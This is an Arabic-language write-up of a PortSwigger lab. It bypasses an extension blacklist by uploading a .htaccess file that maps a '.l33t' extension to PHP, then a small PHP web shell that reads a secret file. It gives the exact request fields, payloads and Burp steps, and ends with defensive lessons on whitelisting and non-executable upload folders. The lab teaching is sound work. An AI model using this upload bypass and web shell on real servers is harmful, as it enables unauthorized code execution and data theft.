# Lab : Web shell upload via extension blacklist bypass

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

- الفكره من الLab ده

```bash
1. Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t

2. Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

3. GET /files/avatars/exploit.l33t
```

للاب ده من فئة **File Upload Vulnerabilities**، وتحديدًا استغلال **خلل جوهري في تصميم Blacklist** للامتدادات المسموح برفعها. المشكلة إن الحماية بتعتمد على **منع امتدادات معينة معروفة (زي `.php`)**، لكن الفكرة نفسها (Blacklist) **معيبة من الأساس** لأنها بتحاول "تتوقع كل الطرق الممكنة للخطر" بدل ما تسمح بس بالحاجات الآمنة المعروفة (Whitelist).

### المفهوم الأساسي: ليه Blacklist أضعف من Whitelist؟

- **Whitelist** (القائمة البيضاء): بتسمح **بس** بامتدادات معروفة وآمنة (زي `.jpg`, `.png`, `.gif`)، وبترفض أي حاجة تانية. آمنة أكتر لأنها **مبنية على "المسموح"**.
- **Blacklist** (القائمة السوداء): بترفض امتدادات معينة معروفة بالخطورة (زي `.php`, `.asp`, `.jsp`)، وبتسمح **بأي حاجة تانية**. خطرة لأنها **مبنية على افتراض إنك عارف كل الطرق الممكنة للتنفيذ**، وده افتراض غلط — السيرفر (زي Apache) بيقدر ينفذ أكواد بامتدادات **مش متوقعة** لو اتظبط الإعدادات كده.

### طبيعة الثغرة في اللاب ده

الموقع مبني على **Apache** ومستخدم فيه موديول **`mod_php`**. Apache بيسمح باستخدام ملف اسمه **`.htaccess`** — وهو ملف إعدادات محلي بيقدر أي حد يرفعه (لو مسموح) يتحكم بيه في سلوك السيرفر **داخل الفولدر ده بس**، من ضمنها تحديد **أي امتداد ملف يترجم لأي نوع محتوى (MIME type) قابل للتنفيذ**.

يعني لو قدرنا **نرفع ملف `.htaccess` بمحتوى مُعد بعناية**، نقدر **"نعلّم" Apache إن امتداد غريب تمامًا (زي `.l33t`) لازم يتعامل معاه كـ PHP قابل للتنفيذ** — وبكده نتجاوز أي blacklist بتمنع `.php` بشكل صريح، لأننا مش بنرفع `.php` أصلاً!

### خطوات الحل بالتفصيل

#### 1. سجل دخول وارفع صورة عادية

سجل دخول بـ `wiener:peter`، وارفع أي صورة كـ **avatar**. روح لصفحة حسابك عشان تشوفها.

#### 2. افحص إزاي بيتم استرجاع الصورة

في **Proxy > HTTP history**، هتلاقي إن الصورة بتتجاب عن طريق:

```
GET /files/avatars/<YOUR-IMAGE>
```

ابعت الطلب ده على **Burp Repeater** — هنحتاجه لاحقًا عشان نجيب أي ملف نرفعه.

#### 3. جهّز PHP Web Shell بسيط

اعمل ملف اسمه `exploit.php` بالمحتوى:

php

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

ده سكريبت بسيط جدًا بيقرا محتوى ملف حساس ويطبعه.

#### 4. جرب ترفع الملف مباشرة

هتلاقي إن الرفع **مرفوض** برسالة توضح إن امتداد `.php` **ممنوع (blacklisted)**.

#### 5. افحص الـ Response عشان تعرف نوع السيرفر

في **Burp proxy history**، افحص الـ response بتاع طلب الرفع (`POST /my-account/avatar`)، هتلاقي في الهيدرز إشارة إن السيرفر شغال على **Apache**. ابعت الطلب ده على **Burp Repeater**.

#### 6. جهّز ملف `.htaccess` ضار (الرفعة الأولى المطلوبة)

في Repeater، عدّل جسم الطلب (الجزء الخاص بالملف) كالتالي:

- غيّر قيمة الـ **`filename`** لـ:

```
  .htaccess
```

- غيّر قيمة هيدر **`Content-Type`** لـ:

```
  text/plain
```

- استبدل محتوى الملف (بدل الكود PHP) بالسطر ده:

apache

```
  AddType application/x-httpd-php .l33t
```

**شرح السطر ده**: توجيه Apache الاسمه **`AddType`** بيقول للسيرفر: **"أي ملف بامتداد `.l33t`، عامله كـ `application/x-httpd-php`"** — يعني نفّذه كـ PHP، رغم إن الاسم غريب تمامًا ومش هيلفت انتباه أي فلتر بيدور على `.php` صراحة.

**ليه الاسم `.l33t` بالذات؟** مفيش سبب خاص — أي امتداد غريب يشتغل، المهم إنه **مش موجود في الـ blacklist** (لأن الـ blacklist بتدور على امتدادات معروفة زي `.php`, `.php5`, `.phtml`، مش امتدادات عشوائية اخترعها المهاجم بنفسه).

#### 7. ابعت الطلب وأكد نجاح الرفع

لاحظ إن ملف `.htaccess` **اترفع بنجاح** (لأن `.htaccess` نفسه مش ممنوع في الـ blacklist).

#### 8. ارجع للطلب الأصلي وعدّل الامتداد (الرفعة الثانية)

ارجع لطلب رفع `exploit.php` الأصلي (باستخدام الـ back arrow في Repeater's history). غيّر قيمة الـ `filename` من:

```
exploit.php
```

لـ:

```
exploit.l33t
```

ابعت الطلب. المرة دي **مفيش رفض**، لأن `.l33t` **مش موجود في الـ blacklist أصلاً** — البلاك ليست عمياء تمامًا عن الامتداد الجديد ده.

#### 9. نفّذ الملف واستخرج السر

ارجع للتاب التاني في Repeater (بتاع `GET /files/avatars/<YOUR-IMAGE>`)، واستبدل اسم الصورة بـ:

```
exploit.l33t
```

ابعت الطلب. بما إن ملف `.htaccess` اللي رفعناه **موجود في نفس الفولدر**، Apache هيطبّق التوجيه بتاعه على أي ملف `.l33t` في الفولدر ده — فهينفذ ملفنا **كـ PHP فعلي**، ونتيجة تنفيذه هتظهر في الـ response:

```
محتوى ملف /home/carlos/secret
```

#### 10. سلّم الحل

انسخ السر اللي ظهر، وقدّمه في زرار **"Submit solution"** أعلى صفحة اللاب.

### ليه ده بيحصل تقنيًا

python

```python
ALLOWED_EXTENSIONS_BLACKLIST = [".php", ".php3", ".php4", ".php5", ".phtml", ".pht"]def upload_avatar(file):    extension = get_extension(file.filename)    if extension in ALLOWED_EXTENSIONS_BLACKLIST:        return "Extension not allowed", 403    save_file(file, f"/files/avatars/{file.filename}")   # ❌ بيقبل أي امتداد تاني، بما فيه .htaccess و .l33t    return "Uploaded successfully"
```

المشكلة الجوهرية مركّبة من نقطتين:

1. **الـ blacklist بتمنع امتدادات "معروفة ومتوقعة" بس** — مفيش طريقة "تتخيل كل الامتدادات الممكنة" اللي ممكن Apache يفسّرها كقابلة للتنفيذ، خصوصًا لو المهاجم يقدر **يضيف امتداد جديد بنفسه** عن طريق `.htaccess`.
2. **`.htaccess` نفسه مش في الـ blacklist** — لأنه مش "كود قابل للتنفيذ" بشكله الظاهري (هو ملف إعدادات نصي)، لكنه فعليًا **بيدّيك تحكم كامل في سلوك السيرفر جوه الفولدر ده**، وده بيخليه **أخطر من رفع أي كود مباشر**.

### الدرس المستفاد

- **الاعتماد على Blacklist لمنع امتدادات ملفات خطيرة ضعيف بطبيعته** — الحل الصحيح هو **Whitelist صارم**: اسمح فقط بامتدادات معروفة وآمنة (`.jpg`, `.png`, `.gif`, إلخ)، وارفض أي حاجة غير موجودة في القائمة دي، بدل محاولة سرد كل الامتدادات الخطيرة الممكنة.
- **ملفات إعدادات السيرفر (زي `.htaccess` في Apache، أو `web.config` في IIS) لازم تُمنع من الرفع بشكل صريح دائمًا** — لأنها بتقدر تغيّر قواعد اللعبة بالكامل داخل الفولدر اللي هي فيه، حتى لو مش فيها "كود تنفيذي" مباشر بشكلها الظاهري.
- **فحص نوع السيرفر (Apache, Nginx, IIS) من الهيدرز مهم جدًا في اختبار File Upload**، لأن كل سيرفر له آليات وملفات إعدادات مختلفة يمكن استغلالها (زي `.htaccess` لـ Apache، أو `web.config` لـ IIS مع تقنيات مشابهة).
- **التحقق من نوع الملف لازم يحصل على عدة مستويات معًا** — مش بس امتداد الاسم، لكن كمان: فحص الـ **Magic bytes / محتوى الملف الفعلي**، فحص الـ **Content-Type header**، وتخزين الملفات المرفوعة في **مكان مش قابل للتنفيذ direct من السيرفر** (زي فولدر منفصل بصلاحيات execute معطلة، أو خدمة تخزين خارجية زي S3).
- المسار الفيزيائي اللي بيتخزن فيه الملفات المرفوعة (زي `/files/avatars/`) **المفروض لا يُسمح فيه بتنفيذ أي كود من الأساس** (عن طريق إعدادات صريحة في السيرفر)، بغض النظر عن أي فحص على مستوى التطبيق — وده مبدأ "**Defense in Depth**" اللي بنشوفه بيتكرر في كل الفئات المختلفة من الثغرات اللي شرحناها.
